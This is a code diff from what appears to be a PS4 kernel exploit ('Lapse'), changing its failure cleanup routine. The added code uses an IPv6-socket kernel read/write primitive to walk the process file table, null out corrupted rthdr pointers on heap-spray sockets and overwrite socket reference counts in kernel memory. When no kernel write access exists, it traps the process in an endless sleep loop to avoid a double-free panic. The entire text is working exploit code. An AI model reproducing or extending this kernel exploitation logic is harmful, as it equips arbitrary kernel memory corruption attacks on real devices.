@@ -2228,10 +2228,85 @@ function cleanup_fail () {
         sds_alt = null
       }
     }
-    // If sd_pair exists: sockets may have aliased/dangling kernel pointers.
-    // We intentionally leak them — the kernel will handle cleanup on process
-    // exit. This is probabilistic but matches observed behavior where closing
-    // the app sometimes works fine even after a failed exploit.
+    // If sd_pair exists: sockets have aliased/dangling kernel pointers.
+    // Strategy depends on whether we have kernel R/W to repair them.
+    if (sd_pair !== null && kernel.addr.curproc_ofiles && kernel_offset) {
+      // === STAGE 4+ REPAIR: We have kernel R/W! ===
+      // Use it to repair corrupted kernel objects before allowing app close.
+      log('cleanup_fail: kernel R/W available — attempting repair...')
+      let repair_ok = false
+      try {
+        const kread8_fn = (addr: BigInt) => {
+          return ipv6_kernel_rw.ipv6_kread8(addr)
+        }
+
+        const repair_get_fd_data = (sock: BigInt) => {
+          const filedescent_addr = (kernel.addr.curproc_ofiles!).add(Number(sock) * kernel_offset.SIZEOF_OFILES!)
+          const file_addr = kread8_fn(filedescent_addr.add(0))
+          return kread8_fn(file_addr.add(0))
+        }
+
+        const repair_get_pktopts = (sock: BigInt) => {
+          const fd_data = repair_get_fd_data(sock)
+          const pcb = kread8_fn(fd_data.add(kernel_offset.SO_PCB!))
+          return kread8_fn(pcb.add(kernel_offset.INPCB_PKTOPTS!))
+        }
+
+        const off_ip6po_rthdr = kernel_offset.IP6PO_RTHDR!
+
+        // Null out corrupted rthdr pointers on spray sockets
+        if (sds !== null) {
+          for (let i = 0; i < sds.length; i++) {
+            try {
+              const pktopts = repair_get_pktopts(sds[i]!)
+              // Write 0 (NULL) to ip6po_rthdr field to prevent double-free
+              const rthdr_buf = malloc(8)
+              write64(rthdr_buf, 0)
+              ipv6_kernel_rw.ipv6_kwrite(pktopts.add(off_ip6po_rthdr), rthdr_buf)
+            } catch (e) { /* skip individual socket errors */ }
+          }
+          log('  Nullified rthdr pointers on sds sockets')
+        }
+
+        if (sds_alt !== null) {
+          for (let i = 0; i < sds_alt.length; i++) {
+            try {
+              const pktopts = repair_get_pktopts(sds_alt[i]!)
+              const rthdr_buf = malloc(8)
+              write64(rthdr_buf, 0)
+              ipv6_kernel_rw.ipv6_kwrite(pktopts.add(off_ip6po_rthdr), rthdr_buf)
+            } catch (e) { /* skip individual socket errors */ }
+          }
+          log('  Nullified rthdr pointers on sds_alt sockets')
+        }
+
+        // Increase ref counts on potentially corrupted sockets to prevent deallocation
+        const ref_count_socks: BigInt[] = []
+        if (ipv6_kernel_rw.data.master_sock) ref_count_socks.push(ipv6_kernel_rw.data.master_sock)
+        if (ipv6_kernel_rw.data.victim_sock) ref_count_socks.push(ipv6_kernel_rw.data.victim_sock)
+
+        for (const sock of ref_count_socks) {
+          try {
+            const sock_addr = repair_get_fd_data(sock)
+            const ref_buf = malloc(4)
+            write32(ref_buf, 0x100) // so_count = high value
+            ipv6_kernel_rw.ipv6_kwrite(sock_addr, ref_buf)
+          } catch (e) { /* skip */ }
+        }
+        log('  Increased ref counts on kernel R/W sockets')
+
+        repair_ok = true
+        log('cleanup_fail: kernel repair SUCCESSFUL — safe to close app')
+      } catch (e) {
+        log('cleanup_fail: kernel repair FAILED: ' + (e as Error).message)
+        repair_ok = false
+      }
+
+      if (repair_ok) {
+        // Repair succeeded — corruption is fixed, safe to let app close
+        sd_pair = null // Mark as safe
+      }
+    }
 
     // Restore scheduling state
     if (prev_core >= 0) {
@@ -2247,11 +2322,19 @@ function cleanup_fail () {
   }
 
   if (sd_pair !== null) {
-    // Corrupted kernel objects exist. Add a delay to let any in-flight
-    // kernel operations settle before the app potentially closes.
-    utils.notify('Failed! Restart console to try again')
-    nanosleep_fun(2000000000) // 2 second delay for safety
+    // === STAGE 2-3 BLOCK: Corrupted kernel objects, NO kernel R/W ===
+    // The ONLY way to prevent kernel panic is to keep the process alive.
+    // If the process exits, kernel will free corrupted objects → double-free → panic.
+    // PS4 stays stable — user retains full control.
+    log('cleanup_fail: BLOCKING process exit to prevent kernel panic')
+    log('cleanup_fail: PS4 is stable. Hold power button 7 seconds to restart.')
+    utils.notify('Failed! Hold power 7s to restart')
+    // Infinite sleep — process never exits, kernel never frees corrupted objects
+    while (true) {
+      nanosleep_fun(2000000000) // sleep 2 seconds, repeat forever
+    }
   } else {
+    // Safe to close — either no corruption existed, or we repaired it
     utils.notify('Lapse Failed! Restart to try again')
   }
 }
